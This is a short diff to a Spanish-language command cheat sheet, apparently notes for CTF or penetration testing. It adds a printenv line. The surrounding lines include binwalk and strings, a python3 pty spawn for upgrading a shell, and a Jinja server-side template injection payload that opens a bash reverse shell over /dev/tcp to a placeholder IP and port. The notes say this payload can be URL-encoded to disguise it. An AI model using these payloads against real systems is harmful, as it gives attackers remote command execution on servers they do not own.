@@ -54,6 +54,8 @@ binwalk -e (archivo ) [escanea un archivo binario en busca de datos incrustados 
 
 strings (archivo) [extrae las cadenas de texto de un archivo]
 
+printenv (variable) [sirve para mostrar variables de entorno del sistema]
+
 python3 -c 'import pty;pty.spawn("/bin/bash");' [para invocar una shell si esta python3 instalado]
 
 {% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/IP/PUERTO 0>&1"')}} [si se codifica en url puede actuar como shell reversa disfrazado con plantilla de tipo Jinja] 
